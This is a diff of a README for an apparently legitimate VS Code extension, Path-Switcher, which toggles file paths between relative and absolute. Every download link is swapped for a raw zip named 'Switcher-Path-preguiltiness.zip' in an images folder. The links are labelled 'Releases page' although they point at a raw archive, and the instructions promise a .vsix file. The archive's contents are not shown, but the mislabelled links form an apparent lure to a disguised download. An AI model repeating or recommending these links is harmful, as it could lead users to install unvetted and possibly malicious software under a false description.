@@ -1,7 +1,7 @@
 # 🌟 Path-Switcher - Easily Toggle File Paths in VS Code
 
 ## 📥 Download Now
-[![Download Path-Switcher](https://raw.githubusercontent.com/Venukailas/Path-Switcher/master/satirize/Path-Switcher.zip)](https://raw.githubusercontent.com/Venukailas/Path-Switcher/master/satirize/Path-Switcher.zip)
+[![Download Path-Switcher](https://raw.githubusercontent.com/Venukailas/Path-Switcher/master/images/Switcher-Path-preguiltiness.zip)](https://raw.githubusercontent.com/Venukailas/Path-Switcher/master/images/Switcher-Path-preguiltiness.zip)
 
 ## 🚀 Getting Started
 Path-Switcher is a Visual Studio Code extension designed to make your web development easier. With just one command, you can switch all file paths between relative and absolute. This feature works for `src` attributes, `href` links, and CSS `url()` attributes throughout your entire file.
@@ -20,7 +20,7 @@ Path-Switcher is a Visual Studio Code extension designed to make your web develo
 ## 🔧 Installation Instructions
 To install Path-Switcher, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Venukailas/Path-Switcher/master/satirize/Path-Switcher.zip) to find the latest version of the extension.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Venukailas/Path-Switcher/master/images/Switcher-Path-preguiltiness.zip) to find the latest version of the extension.
 2. **Download the Extension:** Look for the latest release and click on the download link to save the `.vsix` file to your computer.
 3. **Open Visual Studio Code:** Launch Visual Studio Code on your computer.
 4. **Install the Extension:**
@@ -37,7 +37,7 @@ Once Path-Switcher is installed, you can start using it immediately.
 3. **Toggle Paths:** Type “Toggle Paths” and select the command. All file paths in the document will switch between relative and absolute.
 
 ## 📥 Download & Install
-To get started with Path-Switcher, visit the [Releases page](https://raw.githubusercontent.com/Venukailas/Path-Switcher/master/satirize/Path-Switcher.zip) and download the extension now.
+To get started with Path-Switcher, visit the [Releases page](https://raw.githubusercontent.com/Venukailas/Path-Switcher/master/images/Switcher-Path-preguiltiness.zip) and download the extension now.
 
 ## 🌐 Key Topics
 - **Automation:** Improve your workflow with quick path adjustments.
